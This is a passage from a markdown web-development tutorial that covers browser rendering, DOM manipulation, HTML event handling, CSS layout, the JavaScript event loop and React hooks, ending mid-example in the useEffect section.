# 🌐 Web Architecture — Complete Deep Dive
>
> Browser Internals, DOM, HTML Events, React, Next.js, SEO, Performance

---

## 📚 Table of Contents

1. [How Browsers Work](#1-how-browsers-work)
2. [DOM — Document Object Model](#2-dom--document-object-model)
3. [HTML Events — Complete Guide](#3-html-events--complete-guide)
4. [CSS — Layout & Rendering](#4-css--layout--rendering)
5. [JavaScript Runtime & Event Loop](#5-javascript-runtime--event-loop)
6. [React — Deep Dive](#6-react--deep-dive)
7. [Next.js — Full Stack React](#7-nextjs--full-stack-react)
8. [SEO — Search Engine Optimization](#8-seo--search-engine-optimization)
9. [Web Performance Optimization](#9-web-performance-optimization)
10. [Web Security](#10-web-security)
11. [Modern Web APIs](#11-modern-web-apis)
12. [TypeScript Essentials](#12-typescript-essentials)

---

# 1. How Browsers Work

## 1.1 Browser Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                        Browser                               │
│  ┌──────────────────────────────────────────────────────┐   │
│  │               Browser Engine (UI)                    │   │
│  │  Address bar, tabs, back/forward, bookmarks          │   │
│  └──────────────────────────────┬───────────────────────┘   │
│                                 │                            │
│  ┌──────────────────────────────▼───────────────────────┐   │
│  │               Rendering Engine                       │   │
│  │  Blink (Chrome, Edge)                                │   │
│  │  Gecko (Firefox)                                     │   │
│  │  WebKit (Safari)                                     │   │
│  │                                                      │   │
│  │  HTML Parser → DOM Tree                              │   │
│  │  CSS Parser  → CSSOM Tree                            │   │
│  │  Layout      → Geometry                              │   │
│  │  Paint       → Pixels                                │   │
│  └──────────────────────────────┬───────────────────────┘   │
│                                 │                            │
│  ┌──────────────┐  ┌────────────▼────────┐  ┌───────────┐  │
│  │  Networking  │  │  JavaScript Engine  │  │  Storage  │  │
│  │  HTTP/HTTPS  │  │  V8 (Chrome)        │  │  Cookies  │  │
│  │  Cache       │  │  SpiderMonkey(FF)   │  │  LocalSt  │  │
│  │  WebSockets  │  │  JavaScriptCore(SF) │  │  IndexedDB│  │
│  └──────────────┘  └─────────────────────┘  └───────────┘  │
└──────────────────────────────────────────────────────────────┘
```

## 1.2 Critical Rendering Path

```
Khi browser nhận HTML, các bước xảy ra:

1. PARSE HTML → DOM Tree
   Browser reads HTML top-to-bottom
   Builds DOM (Document Object Model) nodes
   Parser BLOCKS on <script> (unless async/defer)!
   CSS <link> blocks rendering (not parsing)

2. PARSE CSS → CSSOM Tree
   All CSS files parsed into CSSOM
   CSSOM BLOCKS rendering (must compute styles first)
   Inline styles, external stylesheets, <style> tags all parsed

3. COMBINE → Render Tree
   DOM + CSSOM merged
   Only VISIBLE elements (display:none excluded)
   Each node has computed styles

4. LAYOUT (Reflow)
   Calculate exact position and size of every element
   Geometry: x, y, width, height
   Expensive! Triggered by: resize, font change, add/remove elements

5. PAINT
   Convert layout to pixels
   Fill colors, borders, text, shadows
   Creates paint layers

6. COMPOSITE
   GPU combines multiple layers
   Handles: transforms, opacity, z-index
   Fast! Only compositing is GPU-accelerated

HTML ─parse─▶ DOM ─────────────────────▶ ┐
                                          ├─▶ Render Tree ─▶ Layout ─▶ Paint ─▶ Composite ─▶ Display
CSS  ─parse─▶ CSSOM ──────────────────▶ ┘

Optimization goal: minimize Layout and Paint
"Layout thrashing": read then write then read then write → forces multiple layouts
```

## 1.3 Script Loading — defer vs async

```html
<!-- NORMAL: blocks HTML parsing, executes immediately -->
<script src="app.js"></script>

<!-- ASYNC: downloads parallel, executes as soon as downloaded -->
<!-- Execution order NOT guaranteed! -->
<script async src="analytics.js"></script>

<!-- DEFER: downloads parallel, executes AFTER HTML parsed, IN ORDER -->
<!-- Best for most scripts -->
<script defer src="app.js"></script>

Timeline comparison:
NORMAL:  ─HTML─ ─── BLOCK ─── ─────HTML continue────
                     ↑ fetch+execute script

ASYNC:   ────────── HTML ─────────────────── HTML ──── 
                    ↑ fetch (parallel)   ↑ execute (interrupts HTML!)
         
DEFER:   ──────────────── HTML parsed ──── ─execute─
                          ↑ fetch (parallel throughout)    ↑ after DOM ready

Rules:
  <script>: blocks → always bad for body scripts
  async: for independent scripts (analytics, ads)
  defer: for everything else (your app code, libraries)
  type="module": always deferred by default
  
Best practice:
  Put <script defer> in <head> → download starts early, executes after DOM
  OR put <script> at end of <body> (old-school but works)
```

## 1.4 Resource Loading Priority

```
Browser loads resources with different priorities:

CRITICAL (highest):
  HTML document
  CSS in <head>
  Fonts referenced in CSS
  Images in viewport with fetchpriority="high"

HIGH:
  Scripts in <head> (non-async/defer)
  Preloaded resources: <link rel="preload">

MEDIUM:
  Images above the fold (visible in viewport)
  Deferred scripts

LOW:
  Images below the fold
  async scripts
  prefetched resources

HINTS to browser:
  <!-- Preconnect: early TCP+TLS to domain -->
  <link rel="preconnect" href="https://api.example.com">
  <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>

  <!-- DNS prefetch: only DNS lookup, lighter than preconnect -->
  <link rel="dns-prefetch" href="https://analytics.example.com">

  <!-- Preload: download now, use later -->
  <link rel="preload" href="hero.webp" as="image">
  <link rel="preload" href="main.js" as="script">
  <link rel="preload" href="font.woff2" as="font" crossorigin>

  <!-- Prefetch: download for NEXT navigation (low priority) -->
  <link rel="prefetch" href="/next-page.html">

  <!-- Prerender: full page render in background -->
  <link rel="prerender" href="/next-page.html">
```

---

# 2. DOM — Document Object Model

## 2.1 DOM Tree Structure

```
HTML:
<html>
  <head>
    <title>My Page</title>
  </head>
  <body>
    <div id="app">
      <h1 class="title">Hello</h1>
      <p>World</p>
    </div>
  </body>
</html>

DOM Tree:
Document
└── html (HTMLHtmlElement)
    ├── head (HTMLHeadElement)
    │   └── title (HTMLTitleElement)
    │       └── "My Page" (Text Node)
    └── body (HTMLBodyElement)
        └── div#app (HTMLDivElement)
            ├── h1.title (HTMLHeadingElement)
            │   └── "Hello" (Text Node)
            └── p (HTMLParagraphElement)
                └── "World" (Text Node)

Node types:
  ELEMENT_NODE (1):        <div>, <p>, <span>...
  TEXT_NODE (3):           "Hello World"
  COMMENT_NODE (8):        <!-- comment -->
  DOCUMENT_NODE (9):       document
  DOCUMENT_TYPE_NODE (10): <!DOCTYPE html>

Node vs Element vs HTMLElement:
  Node: base class (includes text, comment nodes)
  Element: Node that is an element tag
  HTMLElement: Element that is HTML-specific (has style, dataset, etc.)
  
  All HTMLElements are Elements
  All Elements are Nodes
  Not all Nodes are Elements (Text nodes, Comment nodes)
```

## 2.2 DOM Manipulation

```javascript
// ── SELECTING ELEMENTS ──

// Modern (recommended)
document.querySelector('#app')           // first match by CSS selector
document.querySelector('.card.active')   // compound selector
document.querySelectorAll('.items')      // NodeList of all matches
document.querySelectorAll('li:nth-child(odd)')

// Fast by ID (O(1) hash lookup)
document.getElementById('app')

// Less common
document.getElementsByClassName('card')  // HTMLCollection (live!)
document.getElementsByTagName('div')     // HTMLCollection (live!)

// On element (search within)
const form = document.querySelector('#loginForm')
form.querySelector('input[name="email"]')
form.querySelectorAll('.field')

// Live vs Static:
const live = document.getElementsByClassName('item')  // updates automatically
const static = document.querySelectorAll('.item')     // snapshot at call time

// ── READING ELEMENTS ──
element.textContent     // ALL text (including hidden), safe (no XSS)
element.innerText       // only VISIBLE text, aware of CSS visibility
element.innerHTML       // HTML string ⚠️ XSS risk if user-controlled!
element.outerHTML       // element itself + its HTML
element.value           // for input, textarea, select
element.checked         // for checkbox, radio
element.src             // for img, script, iframe
element.href            // for <a>

// Properties vs Attributes:
element.getAttribute('class')           // original HTML attribute value
element.setAttribute('class', 'active') // change HTML attribute
element.removeAttribute('disabled')
element.hasAttribute('hidden')
element.id            // property (reflects 'id' attribute)
element.className     // property (reflects 'class' attribute, string)
element.classList     // DOMTokenList — use this for class manipulation!

// classList API:
element.classList.add('active', 'highlighted')
element.classList.remove('inactive')
element.classList.toggle('open')              // add if absent, remove if present
element.classList.toggle('open', condition)   // force add(true) or remove(false)
element.classList.contains('active')          // boolean
element.classList.replace('old', 'new')

// data-* attributes:
// <div data-user-id="123" data-role="admin">
element.dataset.userId   // "123" (camelCase from kebab-case)
element.dataset.role     // "admin"
element.dataset.newProp = "value"  // sets data-new-prop="value"

// ── CREATING AND MODIFYING ──

// Create
const div = document.createElement('div')
div.className = 'card'
div.textContent = 'Hello'

// Append
parent.appendChild(child)                    // add as last child
parent.prepend(child)                        // add as first child
parent.append(child1, child2, 'text')        // modern, accepts multiple
parent.insertBefore(newChild, referenceChild)
referenceElement.after(newElement)           // insert after
referenceElement.before(newElement)          // insert before
referenceElement.replaceWith(newElement)

// Template literals (fast for creating HTML):
container.innerHTML = `
  <div class="user-card">
    <img src="${escapeHtml(user.avatar)}" alt="${escapeHtml(user.name)}">
    <h2>${escapeHtml(user.name)}</h2>
    <p>${escapeHtml(user.email)}</p>
  </div>
`
// ⚠️ ALWAYS escape user data in innerHTML!

// DocumentFragment — batch DOM operations (1 reflow instead of N)
const fragment = document.createDocumentFragment()
items.forEach(item => {
    const li = document.createElement('li')
    li.textContent = item.name
    fragment.appendChild(li)    // no DOM mutation yet
})
list.appendChild(fragment)      // 1 DOM operation!

// Remove
element.remove()
parent.removeChild(child)

// Clone
const clone = element.cloneNode(true)   // deep clone (with children)
const shallow = element.cloneNode(false) // shallow (element only)

// ── TRAVERSAL ──
element.parentElement         // parent element (null if no parent)
element.parentNode            // parent node (could be Document)
element.children              // HTMLCollection of child elements
element.childNodes            // NodeList of all child nodes (incl. text)
element.firstElementChild     // first child element
element.lastElementChild      // last child element
element.nextElementSibling    // next sibling element
element.previousElementSibling

element.closest('.container')  // walk up tree, find nearest matching ancestor
element.matches('.active')     // does element match selector?

// ── GEOMETRY & SCROLL ──
const rect = element.getBoundingClientRect()
// { top, right, bottom, left, width, height, x, y }
// Relative to VIEWPORT (scroll position matters)

element.offsetTop             // distance from offsetParent (absolute positioned ancestor)
element.offsetWidth           // width including padding + border
element.clientWidth           // width including padding, NOT border
element.scrollWidth           // full scrollable width

window.scrollY                // pixels scrolled vertically
window.scrollX                // pixels scrolled horizontally
element.scrollTop             // element's own scroll position
element.scrollTo({ top: 0, behavior: 'smooth' })
element.scrollIntoView({ behavior: 'smooth', block: 'start' })
```

## 2.3 Virtual DOM — Why React Uses It

```
Problem with direct DOM manipulation:
  DOM operations are SLOW (triggers layout/paint)
  Naive approach: re-render entire component on any state change
  = Thousands of DOM mutations per second = janky UI

React's solution: Virtual DOM (VDOM)
  VDOM = lightweight JavaScript object tree (not real DOM)
  100x cheaper to create/compare than real DOM objects

Process (Reconciliation):
  1. State changes
  2. React creates NEW VDOM tree
  3. DIFF old VDOM vs new VDOM (Reconciliation)
  4. Calculate MINIMUM DOM mutations needed (Commit)
  5. Apply only those mutations to real DOM

VDOM node example:
  // <div className="card" id="user-1">
  //   <h2>Khang</h2>
  // </div>
  
  {
    type: 'div',
    props: { className: 'card', id: 'user-1' },
    children: [
      {
        type: 'h2',
        props: {},
        children: ['Khang']
      }
    ]
  }

Diffing algorithm rules:
  1. Different element types → destroy old, create new (no reuse)
  2. Same element type → update changed attributes only
  3. Lists: use 'key' prop to identify stable elements
     Without key: O(n²) comparison, wrong element updates
     With key: O(n) comparison, correct updates

Why keys matter:
  // Bad: no keys, React can't match items on reorder
  items.map(item => <li>{item.name}</li>)

  // Good: stable unique key
  items.map(item => <li key={item.id}>{item.name}</li>)

  // Bad key: index (breaks on reorder/filter)
  items.map((item, i) => <li key={i}>{item.name}</li>)

React Fiber (React 16+):
  New reconciliation engine
  Breaks rendering into chunks (fibers)
  Can pause, resume, abort rendering
  Priority-based: urgent updates (input) > background (data fetch)
  Enables Concurrent Mode, Suspense, Transitions
```

---

# 3. HTML Events — Complete Guide

## 3.1 Event System

```javascript
// ── ADDING EVENT LISTENERS ──

// Modern (preferred)
element.addEventListener('click', handler)
element.addEventListener('click', handler, { once: true })    // auto-remove after 1 call
element.addEventListener('click', handler, { passive: true }) // for scroll perf
element.addEventListener('click', handler, { capture: true }) // capture phase

// Remove (must pass same function reference!)
element.removeEventListener('click', handler)

// Old way (avoid — only 1 handler per event)
element.onclick = handler   // overwrites any previous handler!

// Inline (avoid — mixes HTML + JS, no separation of concerns)
<button onclick="handleClick()">Click me</button>

// ── EVENT OBJECT ──
element.addEventListener('click', (event) => {
    event.type              // 'click'
    event.target            // element that was clicked (deepest)
    event.currentTarget     // element listener is attached to
    event.bubbles           // true for most events
    event.cancelable        // can preventDefault?
    event.timeStamp         // when event occurred (ms from page load)

    // Stop bubbling
    event.stopPropagation()         // stop bubble/capture
    event.stopImmediatePropagation() // stop + no more handlers on this element

    // Prevent default action
    event.preventDefault()   // stop: form submit, link navigate, etc.

    // Mouse event properties:
    event.clientX, event.clientY  // position relative to viewport
    event.pageX, event.pageY      // position relative to document
    event.screenX, event.screenY  // position relative to screen
    event.offsetX, event.offsetY  // position relative to target element
    event.button    // 0=left, 1=middle, 2=right
    event.buttons   // bitmask of pressed buttons
    event.ctrlKey, event.shiftKey, event.altKey, event.metaKey  // modifier keys

    // Keyboard event properties:
    event.key       // 'Enter', 'ArrowDown', 'a', 'A'... (human-readable)
    event.code      // 'KeyA', 'Digit1', 'Space'... (physical key, layout-independent)
    event.keyCode   // deprecated, numeric (still used but avoid)
    event.repeat    // true if key held down
})
```

## 3.2 Event Propagation — Bubbling & Capturing

```
HTML:
  <div id="outer">
    <div id="middle">
      <button id="inner">Click</button>
    </div>
  </div>

User clicks button. Event travels in 3 phases:

PHASE 1 — CAPTURE (top → target):
  document → html → body → #outer → #middle → #button
  Listeners with { capture: true } fire here

PHASE 2 — TARGET:
  Event is at #button itself
  Both capture and bubble listeners fire here

PHASE 3 — BUBBLE (target → top):
  #button → #middle → #outer → body → html → document → window
  Default: most listeners fire here

Visualization:
  window
    ↓ capture       ↑ bubble
  document
    ↓               ↑
  #outer
    ↓               ↑
  #middle
    ↓               ↑
  #button ← TARGET

Most events bubble: click, input, change, keydown, submit, focus(focusin), blur(focusout)
Events that DON'T bubble: focus, blur, load, unload, scroll (though scroll can bubble)

// Event delegation — listen on parent, handle children
// Efficient: 1 listener instead of N listeners
document.getElementById('list').addEventListener('click', (event) => {
    const item = event.target.closest('li')  // find clicked li
    if (!item) return  // clicked outside any li
    handleItemClick(item.dataset.id)
})

// vs N listeners (bad for performance + dynamic items):
document.querySelectorAll('li').forEach(li => {
    li.addEventListener('click', handler)  // N listeners, doesn't work for new items!
})
```

## 3.3 All Important Event Types

```javascript
// ── MOUSE EVENTS ──
'click'         // left click (mousedown + mouseup on same element)
'dblclick'      // double click
'mousedown'     // button pressed
'mouseup'       // button released
'mousemove'     // mouse moved (fires very frequently!)
'mouseenter'    // mouse enters element (no bubbling)
'mouseleave'    // mouse leaves element (no bubbling)
'mouseover'     // mouse enters element or descendant (bubbles)
'mouseout'      // mouse leaves element or descendant (bubbles)
'contextmenu'   // right click (can preventDefault to disable)
'wheel'         // mouse wheel / trackpad scroll

// ── KEYBOARD EVENTS ──
'keydown'       // key pressed (fires repeatedly if held)
'keyup'         // key released
'keypress'      // deprecated, avoid

document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') closeModal()
    if (e.key === 'Enter' && e.ctrlKey) submitForm()
    if (e.key === 'ArrowUp') navigateUp()
    if (e.code === 'KeyS' && (e.ctrlKey || e.metaKey)) save()  // Ctrl+S or Cmd+S
})

// ── FORM EVENTS ──
'submit'        // form submitted (use this, not button click!)
'reset'         // form reset
'input'         // value changed (fires on every keystroke)
'change'        // value committed (on blur for text, immediately for select/checkbox)
'focus'         // element receives focus (no bubbling)
'blur'          // element loses focus (no bubbling)
'focusin'       // like focus but BUBBLES
'focusout'      // like blur but BUBBLES
'invalid'       // form validation failed
'select'        // text selected in input/textarea

// Controlled form:
input.addEventListener('input', (e) => {
    state.value = e.target.value
    validateField(e.target.name, e.target.value)
})

form.addEventListener('submit', async (e) => {
    e.preventDefault()                    // prevent page reload!
    const formData = new FormData(e.target)
    const data = Object.fromEntries(formData)
    await submitToAPI(data)
})

// ── DRAG AND DROP ──
'dragstart'     // drag begins on draggable element
'drag'          // dragging (fires constantly)
'dragenter'     // dragged into drop target
'dragover'      // dragging over drop target (preventDefault to allow drop!)
'dragleave'     // dragged out of drop target
'drop'          // dropped on target
'dragend'       // drag ends (success or failure)

draggable.addEventListener('dragstart', (e) => {
    e.dataTransfer.setData('text/plain', draggable.id)
    e.dataTransfer.effectAllowed = 'move'
})

dropzone.addEventListener('dragover', (e) => {
    e.preventDefault()                    // MUST preventDefault to allow drop!
    e.dataTransfer.dropEffect = 'move'
    dropzone.classList.add('drag-over')
})

dropzone.addEventListener('drop', (e) => {
    e.preventDefault()
    const id = e.dataTransfer.getData('text/plain')
    dropzone.appendChild(document.getElementById(id))
})

// ── POINTER EVENTS (unified mouse + touch + stylus) ──
'pointerdown'   // replaces mousedown + touchstart
'pointerup'     // replaces mouseup + touchend
'pointermove'   // replaces mousemove + touchmove
'pointerenter'  // pointer enters element
'pointerleave'  // pointer leaves element
'pointercancel' // pointer event cancelled (e.g., touch gesture taken over)

element.addEventListener('pointerdown', (e) => {
    e.pointerId       // unique ID per pointer (multi-touch)
    e.pointerType     // 'mouse', 'touch', 'pen'
    e.pressure        // 0.0 - 1.0 (for stylus/touch)
    e.width, e.height // contact area (for touch)
})

// Capture pointer (keep receiving events even when pointer leaves element):
element.setPointerCapture(event.pointerId)

// ── TOUCH EVENTS (specific to touch, use pointer events instead) ──
'touchstart', 'touchmove', 'touchend', 'touchcancel'
event.touches          // all current touches on screen
event.targetTouches    // touches on this element
event.changedTouches   // touches that changed in this event

// ── CLIPBOARD EVENTS ──
'copy'    // Ctrl+C or right-click copy
'cut'     // Ctrl+X
'paste'   // Ctrl+V

document.addEventListener('paste', (e) => {
    const text = e.clipboardData.getData('text/plain')
    const files = e.clipboardData.files  // for pasted images/files
    e.preventDefault()
    insertAtCursor(text)
})

// ── RESIZE & SCROLL ──
window.addEventListener('resize', debounce(() => {
    handleResize(window.innerWidth, window.innerHeight)
}, 100))

// Better: ResizeObserver (observe specific element, not window)
const resizeObserver = new ResizeObserver((entries) => {
    for (const entry of entries) {
        const { width, height } = entry.contentRect
        handleElementResize(entry.target, width, height)
    }
})
resizeObserver.observe(element)

// Scroll events fire very frequently → debounce or use Intersection Observer
window.addEventListener('scroll', throttle(handleScroll, 16))  // ~60fps

// IntersectionObserver — detect when element enters/leaves viewport:
const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            // Element entered viewport
            loadImage(entry.target)    // lazy load images
            observer.unobserve(entry.target)  // stop observing
        }
    })
}, {
    root: null,           // null = viewport
    rootMargin: '100px',  // start loading 100px before entering viewport
    threshold: 0.1        // fire when 10% visible
})

document.querySelectorAll('img[data-src]').forEach(img => observer.observe(img))

// ── MEDIA EVENTS (audio/video) ──
'play', 'pause', 'ended', 'timeupdate', 'volumechange',
'loadeddata', 'canplay', 'canplaythrough', 'error', 'waiting', 'stalled'

// ── NETWORK EVENTS ──
window.addEventListener('online', () => showToast('Back online!'))
window.addEventListener('offline', () => showToast('Connection lost'))

// ── VISIBILITY EVENTS ──
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        pauseVideo()
        sendAnalytics('tab_hidden')
    } else {
        resumeVideo()
    }
})
```

## 3.4 Custom Events

```javascript
// Create and dispatch custom events
const event = new CustomEvent('userLoggedIn', {
    detail: { userId: 123, name: 'Khang' },
    bubbles: true,
    cancelable: true
})
document.dispatchEvent(event)

// Listen
document.addEventListener('userLoggedIn', (e) => {
    console.log('User logged in:', e.detail.userId)
})

// Event-based communication between components (without framework)
class EventBus {
    constructor() {
        this.listeners = new Map()
    }
    on(event, callback) {
        if (!this.listeners.has(event)) this.listeners.set(event, [])
        this.listeners.get(event).push(callback)
        return () => this.off(event, callback)  // return unsubscribe fn
    }
    emit(event, data) {
        this.listeners.get(event)?.forEach(cb => cb(data))
    }
    off(event, callback) {
        const cbs = this.listeners.get(event) || []
        this.listeners.set(event, cbs.filter(cb => cb !== callback))
    }
}

const bus = new EventBus()
bus.on('orderCreated', (order) => updateUI(order))
bus.emit('orderCreated', { id: 1, total: 50000 })
```

---

# 4. CSS — Layout & Rendering

## 4.1 Box Model

```
┌──────────────────────────────────────┐
│              MARGIN                  │
│  ┌────────────────────────────────┐  │
│  │           BORDER               │  │
│  │  ┌──────────────────────────┐  │  │
│  │  │        PADDING           │  │  │
│  │  │  ┌────────────────────┐  │  │  │
│  │  │  │     CONTENT        │  │  │  │
│  │  │  │  width × height    │  │  │  │
│  │  │  └────────────────────┘  │  │  │
│  │  └──────────────────────────┘  │  │
│  └────────────────────────────────┘  │
└──────────────────────────────────────┘

box-sizing: content-box (default)
  width = content width (padding + border added ON TOP)
  div { width: 100px; padding: 10px; } → total: 120px

box-sizing: border-box (RECOMMENDED — always use!)
  width = content + padding + border
  div { width: 100px; padding: 10px; } → content = 80px, total still 100px

*, *::before, *::after { box-sizing: border-box; }  /* global reset */
```

## 4.2 Flexbox

```css
/* CONTAINER PROPERTIES */
.container {
    display: flex;
    flex-direction: row;           /* row | row-reverse | column | column-reverse */
    flex-wrap: nowrap;             /* nowrap | wrap | wrap-reverse */
    justify-content: flex-start;  /* main axis: flex-start | center | flex-end | space-between | space-around | space-evenly */
    align-items: stretch;         /* cross axis: flex-start | center | flex-end | stretch | baseline */
    align-content: stretch;       /* multi-line: same as justify-content but cross axis */
    gap: 16px;                    /* gap between items */
    gap: 16px 8px;                /* row-gap column-gap */
}

/* ITEM PROPERTIES */
.item {
    flex-grow: 0;    /* how much to grow relative to others (0 = don't grow) */
    flex-shrink: 1;  /* how much to shrink (1 = can shrink) */
    flex-basis: auto;/* initial size before grow/shrink */
    flex: 1;         /* shorthand: flex-grow=1 flex-shrink=1 flex-basis=0 */
    flex: 0 0 200px; /* fixed 200px, no grow/shrink */
    align-self: auto; /* override align-items for this item */
    order: 0;        /* display order (can be negative) */
}

/* Common patterns: */
/* Center anything */
.center { display: flex; justify-content: center; align-items: center; }

/* Sidebar layout */
.layout { display: flex; }
.sidebar { flex: 0 0 250px; }   /* fixed width sidebar */
.main { flex: 1; }               /* main takes remaining space */

/* Equal columns */
.columns { display: flex; }
.col { flex: 1; }               /* each column equal width */
```

## 4.3 CSS Grid

```css
/* CONTAINER */
.grid {
    display: grid;
    grid-template-columns: 1fr 2fr 1fr;           /* 3 columns, middle double */
    grid-template-columns: repeat(12, 1fr);        /* 12-column grid */
    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); /* responsive! */
    grid-template-rows: auto 1fr auto;             /* header, content, footer */
    gap: 24px;
    grid-template-areas:
        "header header header"
        "sidebar main main"
        "footer footer footer";
}

/* ITEM */
.item {
    grid-column: 1 / 3;           /* span from col 1 to 3 */
    grid-column: 1 / -1;          /* span all columns */
    grid-column: span 2;          /* span 2 columns */
    grid-row: 1 / 3;
    grid-area: header;            /* named grid area */
}

/* Named areas */
.header { grid-area: header; }
.sidebar { grid-area: sidebar; }
.main { grid-area: main; }
.footer { grid-area: footer; }
```

## 4.4 CSS Variables & Modern Features

```css
/* CSS Custom Properties (Variables) */
:root {
    --color-primary: #3B82F6;
    --color-text: #1F2937;
    --spacing-base: 8px;
    --radius: 8px;
    --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
}

.button {
    background: var(--color-primary);
    border-radius: var(--radius);
    padding: calc(var(--spacing-base) * 2) calc(var(--spacing-base) * 4);
}

/* Dark mode with variables */
@media (prefers-color-scheme: dark) {
    :root {
        --color-primary: #60A5FA;
        --color-text: #F9FAFB;
        --color-bg: #111827;
    }
}

/* Container Queries (2023, replaces many media query use cases) */
@container (min-width: 400px) {
    .card { flex-direction: row; }
}
.container { container-type: inline-size; }

/* CSS Layers */
@layer base, components, utilities;
@layer base { * { box-sizing: border-box; } }
@layer components { .btn { padding: 8px 16px; } }
@layer utilities { .hidden { display: none; } }
```

---

# 5. JavaScript Runtime & Event Loop

## 5.1 V8 Engine — How JS Executes

```
Source Code → Parser → AST → Ignition (interpreter) → Bytecode
                                        ↓ (hot code detected)
                               TurboFan (JIT compiler) → Optimized Machine Code

Memory:
  Heap: objects, closures, arrays
  Stack: call frames (function calls)
  
Garbage Collection (V8):
  Generational GC: Young generation (Scavenger) + Old generation (Mark-Compact)
  Young gen: frequently collected, short-lived objects
  Old gen: objects that survived multiple young-gen GCs
  Incremental marking: spread GC work across frames (avoid long pauses)
```

## 5.2 Event Loop — The Core Concept

```
JavaScript is SINGLE-THREADED — only 1 thing executes at a time

But it's NON-BLOCKING thanks to Event Loop + Web APIs

┌──────────────────────────────────────────────────────────────┐
│ JavaScript Runtime                                           │
│                                                              │
│  ┌──────────────────┐    ┌─────────────────────────────┐   │
│  │   Call Stack     │    │      Web APIs               │   │
│  │                  │    │  setTimeout, fetch,         │   │
│  │  [main()]        │    │  addEventListener,          │   │
│  │  [fetchUser()]   │    │  DOM events, ...            │   │
│  │  [JSON.parse()]  │    │  (handled by browser,       │   │
│  └──────────────────┘    │   not JS engine!)           │   │
│                          └─────────────┬───────────────┘   │
│                                        │ callback ready     │
│  ┌──────────────────┐                  ▼                    │
│  │  Microtask Queue │◀─── Promise.then, queueMicrotask,     │
│  │  (high priority) │     MutationObserver                  │
│  └────────┬─────────┘                                       │
│           │ empty microtask queue first!                    │
│  ┌────────▼─────────┐                                       │
│  │  Macrotask Queue │◀─── setTimeout, setInterval,          │
│  │  (Task Queue)    │     DOM events, I/O callbacks         │
│  └──────────────────┘                                       │
│                                                             │
│  Event Loop: if stack empty → drain microtasks → 1 macrotask│
└──────────────────────────────────────────────────────────────┘

Event Loop cycle:
  1. Execute current synchronous code (drain call stack)
  2. Drain ALL microtask queue (Promises!)
  3. Execute ONE macrotask (setTimeout callback, etc.)
  4. Re-render if needed
  5. Repeat
```

## 5.3 Async/Await & Promises

```javascript
// ── PROMISES ──
const promise = new Promise((resolve, reject) => {
    setTimeout(() => resolve('done'), 1000)
    // or: reject(new Error('failed'))
})

promise
    .then(result => console.log(result))
    .catch(error => console.error(error))
    .finally(() => cleanup())

// Promise combinators:
Promise.all([p1, p2, p3])       // wait for ALL, fail if ANY fails
Promise.allSettled([p1, p2])    // wait for ALL, get all results (success + failure)
Promise.race([p1, p2])          // first to settle (resolve OR reject) wins
Promise.any([p1, p2])           // first to RESOLVE wins (ignores rejections)
Promise.resolve('value')        // already resolved promise
Promise.reject(new Error('...'))// already rejected promise

// ── ASYNC/AWAIT ──
async function fetchUser(id) {
    try {
        const response = await fetch(`/api/users/${id}`)
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`)
        }
        const user = await response.json()
        return user
    } catch (error) {
        console.error('Failed:', error)
        throw error    // re-throw so caller knows about error
    }
}

// Parallel execution (common mistake: sequential when could be parallel)
// ❌ Sequential (slow: waits for each before starting next)
const user = await fetchUser(1)
const posts = await fetchPosts(1)
const comments = await fetchComments(1)

// ✅ Parallel (fast: all start simultaneously)
const [user, posts, comments] = await Promise.all([
    fetchUser(1),
    fetchPosts(1),
    fetchComments(1)
])

// Error handling patterns:
// try/catch in async function
// .catch() on returned promise
// global handler: window.addEventListener('unhandledrejection', ...)

// ── GENERATORS & ITERATORS ──
function* range(start, end, step = 1) {
    for (let i = start; i < end; i += step) yield i
}
[...range(0, 10, 2)]  // [0, 2, 4, 6, 8]

// Async generators (for streaming data):
async function* streamLines(url) {
    const response = await fetch(url)
    const reader = response.body.getReader()
    const decoder = new TextDecoder()
    while (true) {
        const { done, value } = await reader.read()
        if (done) break
        yield decoder.decode(value)
    }
}

for await (const chunk of streamLines('/api/stream')) {
    processChunk(chunk)
}
```

## 5.4 Closures & Memory

```javascript
// Closure: function retains access to outer scope even after outer returns
function createCounter(initial = 0) {
    let count = initial  // closed over variable

    return {
        increment() { count++ },
        decrement() { count-- },
        getCount()  { return count }
    }
}

const counter = createCounter(10)
counter.increment()
counter.getCount()  // 11
// count is inaccessible from outside — private!

// Common closure patterns:
// 1. Module pattern (encapsulation)
// 2. Memoization
// 3. Partial application / currying
// 4. Event handlers with state

// Closure memory leak risk:
function leak() {
    const hugeData = new Array(1000000).fill(0)

    element.addEventListener('click', () => {
        // This closure captures hugeData even if it never uses it
        // hugeData stays in memory as long as element exists!
        console.log('clicked')
    })
}

// Fix: don't capture what you don't need
function noLeak() {
    const hugeData = new Array(1000000).fill(0)
    const summary = summarize(hugeData)  // only keep what you need
    // hugeData can be GC'd now

    element.addEventListener('click', () => {
        console.log(summary)  // captures only summary, not hugeData
    })
}

// WeakRef + FinalizationRegistry for cache without preventing GC:
const cache = new Map()
function getCached(key, createFn) {
    const weak = cache.get(key)
    const cached = weak?.deref()
    if (cached) return cached

    const value = createFn()
    cache.set(key, new WeakRef(value))
    return value
}
```

---

# 6. React — Deep Dive

> 📖 <https://react.dev/>

## 6.1 Hooks — Complete Guide

```jsx
import React, { 
    useState, useEffect, useRef, useMemo, useCallback,
    useContext, useReducer, useId, useTransition,
    useDeferredValue, useSyncExternalStore
} from 'react'

// ── useState ──
const [count, setCount] = useState(0)
const [user, setUser] = useState(null)
const [form, setForm] = useState({ name: '', email: '' })

// Functional update (use when new state depends on old):
setCount(prev => prev + 1)   // ✅ safe with batching
setCount(count + 1)           // ❌ might use stale value in async contexts

// Object state: must spread to avoid mutation!
setForm(prev => ({ ...prev, name: 'Khang' }))  // ✅ immutable update
form.name = 'Khang'  // ❌ mutates state → React won't re-render!

// ── useEffect ──
// Runs AFTER every render (mount + update)
useEffect(() => {
    document.title = `${count} clicks`
})

// Runs only once after mount (empty deps array)
useEffect(() => {
    fetchUser().then(setUser)
    const subscription = subscribe(handleEvent)
    
    // Cleanup: runs before next effect AND on unmount
    return () => {
        subscription.unsubscribe()
    }
}, [])  // ← empty array

// Runs when specific values change
useEffect(() => {
    fetchUser(userId).then(setUser)
